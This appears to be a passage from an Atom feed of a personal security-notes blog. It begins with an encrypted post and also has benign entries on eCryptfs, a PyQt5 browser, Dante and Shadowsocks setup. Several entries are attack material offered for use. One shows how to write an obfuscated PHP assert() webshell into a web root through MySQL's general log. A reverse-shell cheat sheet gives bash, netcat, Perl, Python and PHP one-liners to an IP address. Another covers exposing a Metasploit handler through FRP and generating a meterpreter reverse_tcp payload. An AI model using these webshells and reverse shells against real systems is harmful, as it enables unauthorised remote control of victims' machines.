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 </div>]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="shell" scheme="https://10o0.github.io/categories/shell/"/>
    
    
      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
    
      <category term="应急响应" scheme="https://10o0.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>MySQL&#39;s general-log shell</title>
    <link href="https://10o0.github.io/2018/06/04/MySQL&#39;s%20general-log%20shell/"/>
    <id>https://10o0.github.io/2018/06/04/MySQL&#39;s general-log shell/</id>
    <published>2018-06-04T02:52:12.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MySQL ROOT:</p></blockquote><pre><code>show variables like &apos;%general%&apos;;set global general_log=&apos;on&apos;;SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;;SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;cmd&apos;]));?&gt;&quot;;set global general_log = off;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;MySQL ROOT:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;show variables like &amp;apos;%general%&amp;apos;;
set global general_log=&amp;apos;on&amp;apos;;
S
      
    
    </summary>
    
      <category term="shell" scheme="https://10o0.github.io/categories/shell/"/>
    
    
      <category term="mysql" scheme="https://10o0.github.io/tags/mysql/"/>
    
      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
    
      <category term="log" scheme="https://10o0.github.io/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>Frp结合VPS打造外网Meatsploit</title>
    <link href="https://10o0.github.io/2018/04/19/Frp%EF%BC%8BVPS%E6%89%93%E9%80%A0%E5%A4%96%E7%BD%91Meatsploit/"/>
    <id>https://10o0.github.io/2018/04/19/Frp＋VPS打造外网Meatsploit/</id>
    <published>2018-04-19T03:04:54.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<hr><ul><li><strong>前言：</strong></li></ul><p>本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本：</p><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstallchmod 755 msfinstall &amp;&amp; ./msfinstall</code></pre><a id="more"></a><p>可以用，但是总是时不时崩溃（可能是配置太低），烦的一pi.<br>然后就去Google找到了ngrok的端口转发教程。试了下，可以用，不过用起来反应很慢，时不时还掉线，尼玛啊，最坑的是有的平台（VIP是不可能开的，这辈子都不可能）不能固定外网端口，启动一次客户端就换一个端口，每次都要改Payload，费劲。<br>然后试了下用Frp来转发，相比起来简直不要太爽。</p><p> <strong>1. 准备工作：</strong></p><blockquote><p>VPS一台<br>FRP  ##下载地址：<a href="https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本）" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本）</a></p></blockquote><p> <strong>２.安装步骤：</strong><br><strong>在VPS上执行（我的是Centos x64）：</strong></p><pre><code>wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frptar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64rm frpc&amp;&amp;rm frpc.ini  ##这个是客户端文件，用不上，删不删随意。./frps -c frps.ini　　##默认配置文件启动服务端。</code></pre><p><strong>在自己电脑执行（我的是KALi x64）:</strong></p><pre><code>wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frptar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64rm frps&amp;&amp;rm frps.ini  ##这个是服务端文件，用不上，删不删随意。./frpc -c frpc.ini　　##使用配置文件启动客户端。</code></pre><p> 注意frpc.ini配置文件内容（<a href="https://github.com/fatedier/frp/blob/master/README_zh.md#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">详细参考</a>）：</p><pre><code>[common]server_addr = *.*.*.*  ##VPS的IP地址server_port = 7000[msf]type = tcp　　　　　##协议local_ip = *.*.*.*  ##本地内网主机IP。local_port = 4444　 ##本地MSF监听的端口remote_port = 8011  ##Payload设置的LPORT端口,LHOST为VPS的IP。</code></pre><p>Payload生成实例：</p><pre><code>$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=VPS的IP lport=8011 -f exe -o payload.exe</code></pre><p>MSf监听示例：</p><pre><code>Module options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (windows/x64/meterpreter_reverse_tcp):   Name        Current Setting  Required  Description   ----        ---------------  --------  -----------   EXITFUNC    process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)   EXTENSIONS                   no        Comma-separate list of extensions to load   EXTINIT                      no        Initialization strings for extensions   LHOST       172.16.1.254     yes       The listen address   LPORT       4444             yes       The listen port</code></pre><p>附一张截图：</p><p><img src="http://image.3001.net/images/20180419/15241064908917.jpg!small" alt=""></p><p>结束语：<br>当然frp不止tcp端口转发这一种用法，还可以做socks5,http代理等，其他的自行查看说明文档。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall

chmod 755 msfinstall &amp;amp;&amp;amp; ./msfinstall
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="msf" scheme="https://10o0.github.io/categories/msf/"/>
    
    
      <category term="msf" scheme="https://10o0.github.io/tags/msf/"/>
    
      <category term="frp" scheme="https://10o0.github.io/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>How to encrypt files and folders with eCryptfs in Ubuntu/Debian/kali linux</title>
    <link href="https://10o0.github.io/2018/03/27/encrypt%20in%20linux/"/>
    <id>https://10o0.github.io/2018/03/27/encrypt in linux/</id>
    <published>2018-03-27T04:36:32.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<pre><code>apt-get install ecryptfs-utilsmodprobe ecryptfs  #Load the ecryptfs kernel driverecryptfs-setup-private ##defaultecryptfs-umount-private  # to unmountecryptfs-mount-private  # to mount it again,Switch to another directory except home#######ecryptfs-setup-private --noautoumount  # avoid ecryptfs auto mount at login</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;apt-get install ecryptfs-utils

modprobe ecryptfs  #Load the ecryptfs kernel driver

ecryptfs-setup-private ##default

ecryptfs-u
      
    
    </summary>
    
      <category term="encrypt" scheme="https://10o0.github.io/categories/encrypt/"/>
    
    
      <category term="encrypt" scheme="https://10o0.github.io/tags/encrypt/"/>
    
      <category term="eCryptfs" scheme="https://10o0.github.io/tags/eCryptfs/"/>
    
      <category term="kali" scheme="https://10o0.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Shell Cheat Sheet</title>
    <link href="https://10o0.github.io/2018/03/20/Reverse%20Shell%20Cheat%20Sheet/"/>
    <id>https://10o0.github.io/2018/03/20/Reverse Shell Cheat Sheet/</id>
    <published>2018-03-20T06:56:16.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>set a listener:</p></blockquote><pre><code>nc -nvlp 443</code></pre><blockquote><p>Bash:</p></blockquote><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1</code></pre><blockquote><p>Netcat</p></blockquote><pre><code>nc -nv 192.168.1.11 443 -e /bin/bash ##linuxnc.exe -nv 192.168.1.11 443 -e cmd   ##windows</code></pre><blockquote><p>Perl</p></blockquote><pre><code>perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos;</code></pre><blockquote><p>Python</p></blockquote><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><blockquote><p>PHP</p></blockquote><pre><code>php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;set a listener:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;nc -nvlp 443
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Bash:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;ba
      
    
    </summary>
    
      <category term="shell" scheme="https://10o0.github.io/categories/shell/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
      <category term="bash" scheme="https://10o0.github.io/tags/bash/"/>
    
      <category term="perl" scheme="https://10o0.github.io/tags/perl/"/>
    
      <category term="netcat" scheme="https://10o0.github.io/tags/netcat/"/>
    
      <category term="php" scheme="https://10o0.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Python PyQt5</title>
    <link href="https://10o0.github.io/2018/03/07/Python%E5%AE%9E%E7%94%A8/"/>
    <id>https://10o0.github.io/2018/03/07/Python实用/</id>
    <published>2018-03-07T03:28:47.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Python3，PyQt5实现简易浏览器"><a href="#使用Python3，PyQt5实现简易浏览器" class="headerlink" title="使用Python3，PyQt5实现简易浏览器"></a>使用Python3，PyQt5实现简易浏览器</h1><pre><code>from PyQt5.QtWidgets import QApplicationfrom PyQt5.QtWebEngineWidgets import QWebEngineViewfrom PyQt5.QtCore import QUrlapp = QApplication([])view = QWebEngineView()view.load(QUrl(&quot;https://translate.google.cn&quot;))view.show()app.exec_()</code></pre><hr><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;使用Python3，PyQt5实现简易浏览器&quot;&gt;&lt;a href=&quot;#使用Python3，PyQt5实现简易浏览器&quot; class=&quot;headerlink&quot; title=&quot;使用Python3，PyQt5实现简易浏览器&quot;&gt;&lt;/a&gt;使用Python3，PyQt5实现简易浏览器&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;from PyQt5.QtWidgets import QApplication
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtCore import QUrl

app = QApplication([])
view = QWebEngineView()
view.load(QUrl(&amp;quot;https://translate.google.cn&amp;quot;))
view.show()
app.exec_()
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="https://10o0.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
      <category term="pyqt5" scheme="https://10o0.github.io/tags/pyqt5/"/>
    
      <category term="browser" scheme="https://10o0.github.io/tags/browser/"/>
    
  </entry>
  
  <entry>
    <title>How to setup a socks5 proxy server using Dante</title>
    <link href="https://10o0.github.io/2018/01/22/How-to-setup-a-socks5-proxy-server-using-Dante/"/>
    <id>https://10o0.github.io/2018/01/22/How-to-setup-a-socks5-proxy-server-using-Dante/</id>
    <published>2018-01-22T02:26:52.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<pre><code>debain可用参考链接：https://nfalcone.net/blog/danted-socks-proxy-server/</code></pre><a id="more"></a><p><strong>&gt; 其他：</strong></p><h1 id="socks5软件包安装"><a href="#socks5软件包安装" class="headerlink" title="socks5软件包安装:"></a>socks5软件包安装:</h1><pre><code># apt-get update &amp;&amp; apt-get upgrade# apt-get install dante-server# service danted restart# service danted status# danted -vdanted: dante v1.1.19</code></pre><h1 id="socks5源码安装："><a href="#socks5源码安装：" class="headerlink" title="socks5源码安装："></a>socks5源码安装：</h1><pre><code># cd /usr/src# wget http://www.inet.no/dante/files/dante-1.4.2.tar.gz# tar -zxf dante-1.4.2.tar.gz# cd dante-1.4.2/# apt-get install gcc make#./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --disable-client --without-libwrap --without-bsdauth --without-gssapi --without-krb5 --without-upnp --without-pam# make &amp;&amp; make install# /usr/sbin/sockd -vDante v1.4.2.  Copyright (c) 1997 - 2014 Inferno Nettverk A/S, Norway</code></pre><h1 id="Configuring-Dante-server-service-script"><a href="#Configuring-Dante-server-service-script" class="headerlink" title="Configuring Dante-server service script"></a>Configuring Dante-server service script</h1><pre><code># vim /etc/init.d/sockd</code></pre><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><pre><code>https://www.proxyrack.com/how-to-setup-a-socks5-proxy-server-using-dante/</code></pre><h1 id="debain可能遇到的问题："><a href="#debain可能遇到的问题：" class="headerlink" title="debain可能遇到的问题："></a>debain可能遇到的问题：</h1><blockquote><p>perl: warning: Falling back to the standard locale (“C”)</p></blockquote><pre><code>root@host:~#locale-gen en_GB.UTF-8root@host:~#localectl set-locale LANG=en_GB.UTF-8,LC_ALL=en_GB.UTF-8</code></pre><blockquote><p>参考：<a href="https://konradpodgorski.com/blog/2014/06/23/fixing-locale-problem-debian/" target="_blank" rel="noopener">https://konradpodgorski.com/blog/2014/06/23/fixing-locale-problem-debian/</a></p></blockquote><p>debain VPs 安装失败：仅作记录</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;debain可用参考链接：

https://nfalcone.net/blog/danted-socks-proxy-server/
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="socks5" scheme="https://10o0.github.io/tags/socks5/"/>
    
      <category term="proxy" scheme="https://10o0.github.io/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>SS安装脚本</title>
    <link href="https://10o0.github.io/2018/01/22/SS%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/"/>
    <id>https://10o0.github.io/2018/01/22/SS安装脚本/</id>
    <published>2018-01-22T02:01:21.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一键安装："><a href="#一键安装：" class="headerlink" title="一键安装："></a>一键安装：</h1><pre><code>wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</code></pre><blockquote><p>多用户配置文件：vim /etc/shadowsocks-go/config.json</p></blockquote><pre><code>{    &quot;server&quot;:&quot;0.0.0.0&quot;,    &quot;port_password&quot;:{         &quot;8989&quot;:&quot;password0&quot;,         &quot;9001&quot;:&quot;password1&quot;,         &quot;9002&quot;:&quot;password2&quot;,         &quot;9003&quot;:&quot;password3&quot;,         &quot;9004&quot;:&quot;password4&quot;    },    &quot;method&quot;:&quot;aes-256-cfb&quot;,    &quot;timeout&quot;:600}</code></pre><h1 id="卸载："><a href="#卸载：" class="headerlink" title="卸载："></a>卸载：</h1><pre><code>./shadowsocks-all.sh uninstall</code></pre><a id="more"></a><h1 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h1><blockquote><p>启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。</p></blockquote><pre><code>echo &quot;alias ss=&apos;/etc/init.d/shadowsocks-go&apos;&quot; &gt;&gt; .bashrcShadowsocks-Python 版：/etc/init.d/shadowsocks-python start | stop | restart | statusShadowsocksR 版：/etc/init.d/shadowsocks-r start | stop | restart | statusShadowsocks-Go 版：/etc/init.d/shadowsocks-go start | stop | restart | statusShadowsocks-libev 版：/etc/init.d/shadowsocks-libev start | stop | restart | status各版本默认配置文件Shadowsocks-Python 版：/etc/shadowsocks-python/config.jsonShadowsocksR 版：/etc/shadowsocks-r/config.jsonShadowsocks-Go 版：/etc/shadowsocks-go/config.jsonShadowsocks-libev 版：/etc/shadowsocks-libev/config.json</code></pre><h1 id="VPS测速脚本："><a href="#VPS测速脚本：" class="headerlink" title="VPS测速脚本："></a>VPS测速脚本：</h1><pre><code>wget -qO- –no-check-certificate https://raw.githubusercontent.com/oooldking/script/master/superbench.sh | bashwget -qO- bench.sh | bash   或者     curl -Lso- bench.sh | bash</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一键安装：&quot;&gt;&lt;a href=&quot;#一键安装：&quot; class=&quot;headerlink&quot; title=&quot;一键安装：&quot;&gt;&lt;/a&gt;一键安装：&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh
chmod +x shadowsocks-all.sh
./shadowsocks-all.sh 2&amp;gt;&amp;amp;1 | tee shadowsocks-all.log
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;多用户配置文件：vim /etc/shadowsocks-go/config.json&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;{
    &amp;quot;server&amp;quot;:&amp;quot;0.0.0.0&amp;quot;,
    &amp;quot;port_password&amp;quot;:{
